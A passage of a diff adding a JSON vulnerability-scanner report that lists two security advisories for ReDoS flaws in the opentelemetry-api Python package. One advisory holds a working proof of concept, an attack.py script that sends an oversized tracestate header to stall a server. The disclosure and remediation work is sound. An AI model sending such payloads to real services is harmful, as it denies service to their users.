+                    "1.29.0",
+                    "1.3.0",
+                    "1.30.0",
+                    "1.31.0",
+                    "1.31.1",
+                    "1.32.0",
+                    "1.32.1",
+                    "1.33.0",
+                    "1.33.1",
+                    "1.34.0",
+                    "1.34.1",
+                    "1.35.0",
+                    "1.36.0",
+                    "1.37.0",
+                    "1.38.0",
+                    "1.39.0",
+                    "1.39.1",
+                    "1.4.0",
+                    "1.4.1",
+                    "1.40.0",
+                    "1.41.0",
+                    "1.41.1",
+                    "1.42.0",
+                    "1.42.1",
+                    "1.43.0",
+                    "1.44.0",
+                    "1.45.0",
+                    "1.45.1",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.6.2",
+                    "1.7.0",
+                    "1.7.1",
+                    "1.8.0",
+                    "1.9.0",
+                    "1.9.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-126360"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-11-13T16:43:18Z",
+                "nvd_published_at": "2026-11-13T00:20:11Z",
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n\n`TraceContextTextMapPropagator.extract()` in `opentelemetry-api` is vulnerable to regular expression denial of service (ReDoS) when processing a specially crafted `traceparent` value.\n\nA malformed value containing a trace-context prefix followed by a long whitespace sequence and an embedded newline triggers quadratic-time regex backtracking. Applications that extract trace context from untrusted carriers accepting such strings can experience excessive CPU consumption and request-processing delays.\n\nWhen extraction runs on an asynchronous server’s event-loop thread, a single malicious message can delay unrelated requests handled by that event loop.\n\n## Exposure conditions\n\nExploitation requires attacker-controlled input to reach the affected propagator through a carrier that preserves embedded newlines and permits a sufficiently large value.\n\nConforming HTTP header values cannot contain embedded newlines. However, OpenTelemetry carriers are not restricted to HTTP headers. JSON strings can contain escaped newlines that become newline characters after decoding.\n\nMCP request metadata is one relevant integration path: applications may extract trace context from JSON `params._meta`. Exposure depends on the MCP SDK or instrumentation version, whether extraction invokes the W3C Trace Context propagator, and applicable message-size limits. HTTP header validation does not constrain a `traceparent` string carried inside a JSON body.\n\nAuthentication requirements depend on the application exposing the carrier.\n\n## Impact\n\nThe demonstrated impact is denial of service through excessive CPU consumption and blocked request processing. Repeated malicious messages may sustain service degradation.\n\nThis finding does not demonstrate data disclosure, data modification, or code execution.\n\n## Remediation\n\nUpgrade `opentelemetry-api` to `1.45.2` or a later release containing the fix.\n\nVersion `1.45.2` rejects `traceparent` values longer than 512 characters before regex matching and removes the overlapping suffix and trailing-whitespace expressions.\n\nWhere upgrading is temporarily unavailable, reject oversized values and embedded CR/LF characters before passing untrusted trace-context values to the affected propagator.",
+              "id": "GHSA-mf5v-w3w3-f6cg",
+              "modified": "2026-11-13T17:00:03.925479166Z",
+              "published": "2026-11-13T16:43:18Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/security/advisories/GHSA-mf5v-w3w3-f6cg"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-126360"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/pull/5818"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/pull/5856"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/commit/78123a2755c907c602e02352aebed4be86aa5350"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/commit/faa72dae511ae64a7bf8ca63eff9ad4387d0b939"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/releases/tag/v1.45.2"
+                }
+              ],
+              "schema_version": "1.9.2",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "OpenTelemetry Python API: Denial of service through quadratic-time traceparent parsing"
+            },
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "last_known_affected_version_range": "\u003c= 1.45.0",
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-xcq7-p3pf-p88h/GHSA-xcq7-p3pf-p88h.json"
+                  },
+                  "package": {
+                    "ecosystem": "PyPI",
+                    "name": "opentelemetry-api",
+                    "purl": "pkg:pypi/opentelemetry-api"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "1.45.1"
+                        }
+                      ],
+                      "type": "ECOSYSTEM"
+                    }
+                  ],
+                  "versions": [
+                    "0.10b0",
+                    "0.11b0",
+                    "0.12b0",
+                    "0.13b0",
+                    "0.14b0",
+                    "0.15b0",
+                    "0.16b0",
+                    "0.16b1",
+                    "0.17b0",
+                    "0.1a0",
+                    "0.2a0",
+                    "0.3a0",
+                    "0.4a0",
+                    "0.4a1",
+                    "0.5b0",
+                    "0.6b0",
+                    "0.7b0",
+                    "0.7b1",
+                    "0.8b0",
+                    "0.9b0",
+                    "1.0.0",
+                    "1.0.0rc1",
+                    "1.1.0",
+                    "1.10.0",
+                    "1.10a0",
+                    "1.11.0",
+                    "1.11.1",
+                    "1.12.0",
+                    "1.12.0rc1",
+                    "1.12.0rc2",
+                    "1.13.0",
+                    "1.14.0",
+                    "1.15.0",
+                    "1.16.0",
+                    "1.17.0",
+                    "1.18.0",
+                    "1.19.0",
+                    "1.2.0",
+                    "1.20.0",
+                    "1.21.0",
+                    "1.22.0",
+                    "1.23.0",
+                    "1.24.0",
+                    "1.25.0",
+                    "1.26.0",
+                    "1.27.0",
+                    "1.28.0",
+                    "1.28.1",
+                    "1.28.2",
+                    "1.29.0",
+                    "1.3.0",
+                    "1.30.0",
+                    "1.31.0",
+                    "1.31.1",
+                    "1.32.0",
+                    "1.32.1",
+                    "1.33.0",
+                    "1.33.1",
+                    "1.34.0",
+                    "1.34.1",
+                    "1.35.0",
+                    "1.36.0",
+                    "1.37.0",
+                    "1.38.0",
+                    "1.39.0",
+                    "1.39.1",
+                    "1.4.0",
+                    "1.4.1",
+                    "1.40.0",
+                    "1.41.0",
+                    "1.41.1",
+                    "1.42.0",
+                    "1.42.1",
+                    "1.43.0",
+                    "1.44.0",
+                    "1.45.0",
+                    "1.5.0",
+                    "1.6.0",
+                    "1.6.1",
+                    "1.6.2",
+                    "1.7.0",
+                    "1.7.1",
+                    "1.8.0",
+                    "1.9.0",
+                    "1.9.1"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2026-114603"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1333",
+                  "CWE-400"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2026-10-22T16:22:07Z",
+                "nvd_published_at": null,
+                "severity": "MODERATE"
+              },
+              "details": "## Summary\n`TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.\n\n## Affected component / version\n- Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`).\n- Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between.\n- Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.\n\n## Details\n\n1. The header reaches the parser without any length check:\n\n```python\n# opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57\ntracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # \u003c-- attacker-controlled request header(s), any size\nif tracestate_headers is None:\n    tracestate = None\nelse:\n    tracestate = TraceState.from_header(tracestate_headers)             # \u003c-- no length check before parsing (line 61)\n```\n\n2. The split pattern and the parser:\n```python\n# opentelemetry-api/src/opentelemetry/trace/span.py:45\n_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # \u003c-- only enforced later, in TraceState.__init__, after the split\n_delimiter_pattern = re.compile(r\"[ \\t]*,[ \\t]*\")      # \u003c-- (line 46) starts with an unbounded [ \\t]*\n\n# span.py:382\n@classmethod\ndef from_header(cls, header_list: list[str]) -\u003e TraceState:\n    pairs = {}  # type: dict[str, str]\n    for header in header_list:\n        members: list[str] = re.split(_delimiter_pattern, header)   # \u003c-- (line 400) VULNERABLE: O(N^2) on \"a=b\" + \" \" * N + \"x\"\n        for member in members:\n            if not member:\n                continue\n            match = _member_pattern.fullmatch(member)\n            if not match:\n                _logger.warning(                                    # \u003c-- also logs the entire malformed member (up to the whole header)\n                    \"Member doesn't match the w3c identifiers format %s\",\n                    member,\n                )\n                return cls()\n            ...\n```\n\n`re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \\t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.\n\n3. The sibling propagator already has the missing guard:\n```python\n# baggage/propagation/__init__.py:68\n_MAX_HEADER_LENGTH = 8192\n...\nif len(header.encode()) \u003e self._MAX_HEADER_LENGTH:   # \u003c-- (line 93) rejected before any regex runs; tracestate has no equivalent\n    _logger.warning(...)\n    return context\n```\n\nA 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s.\nMeasured cost of `extract()` on one core (valid `traceparent`, `tracestate: \"a=b\" + N spaces + \"x\"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower). \n\nWhether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.\n\n## Proof of concept\n\n### A. Show the quadratic cost (no server needed)\n\n1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected).\n2. Save as `poc_tracestate.py`:\n```python\nimport logging\nimport time\n\nfrom opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator\n\n# The library logs the whole malformed member at WARNING; silence it so the timings stay readable.\nlogging.disable(logging.CRITICAL)\n\nTRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\"\npropagator = TraceContextTextMapPropagator()\n\nprevious = None\nfor n in (10_000, 20_000, 40_000, 80_000):\n    # N spaces after a valid member, no comma anywhere in the header\n    carrier = {\"traceparent\": TRACEPARENT, \"tracestate\": \"a=b\" + \" \" * n + \"x\"}\n    start = time.perf_counter()\n    propagator.extract(carrier)\n    elapsed = time.perf_counter() - start\n    growth = f\"x{elapsed / previous:.1f}\" if previous else \"-\"\n    print(f\"{n:\u003e7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}\")\n    previous = elapsed\n```\n3. Run `python poc_tracestate.py`.\n4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run:\n```\n  10000 characters    0.06 s  growth when size doubles: -\n  20000 characters    0.26 s  growth when size doubles: x4.0\n  40000 characters    1.04 s  growth when size doubles: x4.0\n  80000 characters    4.13 s  growth when size doubles: x4.0\n```\nReplace `\" \"` with `\"\\t\"` to see ≈1.6× longer.\n\n### B. Show that one request stalls a real server\nThis uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).\n\n1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi \"uvicorn[standard]\"`.\n2. Save as `app.py`:\n```python\nfrom opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware\n\n\nasync def app(scope, receive, send):\n    await send({\"type\": \"http.response.start\", \"status\": 200, \"headers\": [(b\"content-type\", b\"text/plain\")]})\n    await send({\"type\": \"http.response.body\", \"body\": b\"ok\"})\n\n\napp = OpenTelemetryMiddleware(app)\n```\n3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools`\n4. Save as `attack.py`:\n```python\n\"\"\"Send one oversized tracestate request and, while it is being handled,\nmeasure how long an unrelated request to the same server has to wait.\"\"\"\nimport socket\nimport sys\nimport threading\nimport time\n\nHOST, PORT = \"127.0.0.1\", 8000\nN = int(sys.argv[1]) if len(sys.argv) \u003e 1 else 100_000\nTRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\"\n\n\ndef get(path, extra=\"\"):\n    s = socket.create_connection((HOST, PORT), timeout=120)\n    s.sendall(f\"GET {path} HTTP/1.1\\r\\nHost: x\\r\\nConnection: close\\r\\n{extra}\\r\\n\".encode())\n    start, data = time.perf_counter(), b\"\"\n    while chunk := s.recv(65536):\n        data += chunk\n    return time.perf_counter() - start, data.split(b\"\\r\\n\")[0].decode()\n\n\nresult = {}\nextra = f\"traceparent: {TRACEPARENT}\\r\\ntracestate: a=b{' ' * N}x\\r\\n\"\nattacker = threading.Thread(target=lambda: result.update(a=get(\"/attack\", extra)))\nprint(\"idle /ping:               %.3f s  %s\" % get(\"/ping\"))\nattacker.start()\ntime.sleep(0.5)  # let the attack request reach the server first\nprint(\"/ping during the attack:  %.3f s  %s\" % get(\"/ping\"))\nattacker.join()\nprint(\"attack request itself:    %.3f s  %s\" % result[\"a\"])\n```\n5. In a second terminal run `python attack.py 100000`.\n6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run:\n```\nidle /ping:               0.000 s  HTTP/1.1 200 OK\n/ping during the attack:  5.909 s  HTTP/1.1 200 OK     \u003c-- unrelated request delayed ~6 s (event loop blocked)\nattack request itself:    6.408 s  HTTP/1.1 200 OK\n```\n7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.\n\n## Severity\n**Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.\n\n**Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.\n\n**Severity: Medium.**\n\n## Suggested remediation\nReplace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input:\n```diff\n--- a/opentelemetry-api/src/opentelemetry/trace/span.py\n+++ b/opentelemetry-api/src/opentelemetry/trace/span.py\n@@ def from_header(cls, header_list: list[str]) -\u003e TraceState:\n         for header in header_list:\n-            members: list[str] = re.split(_delimiter_pattern, header)\n+            members: list[str] = [m.strip(\" \\t\") for m in header.split(\",\")]\n```\n`_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.\n\n## Credit\n\nDiscovered and reported by SecDim Security Research\nsecdim.com | @secdim | security@secdim.com\n\n---\n\n**FROM MAINTAINERS**\n\n## Summary\n\n`TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.\n\nBecause W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.\n\n## Impact\n\nServices accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.\n\nThe practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.\n\nUnlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.\n\nThe impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.\n\n## Patches\n\nVersions of `opentelemetry-api` up to and including `1.45.0` are affected.\n\nUpgrade `opentelemetry-api` to version `1.45.1` or later.\n\nVersion `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.\n\n## Workarounds\n\nEnsure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.",
+              "id": "GHSA-xcq7-p3pf-p88h",
+              "modified": "2026-10-22T16:30:40.999595074Z",
+              "published": "2026-10-22T16:22:07Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/security/advisories/GHSA-xcq7-p3pf-p88h"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/pull/5749"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/commit/d5224bf4ffdf2aee1b592ad238dcc32ca957f26b"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/blob/main/CHANGELOG.md#version-1451066b1-2026-10-06"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/open-telemetry/opentelemetry-python/releases/tag/v1.45.1"
+                }
+              ],
+              "schema_version": "1.9.0",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "OpenTelemetry Python: Unbounded tracestate parsing in opentelemetry-api"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
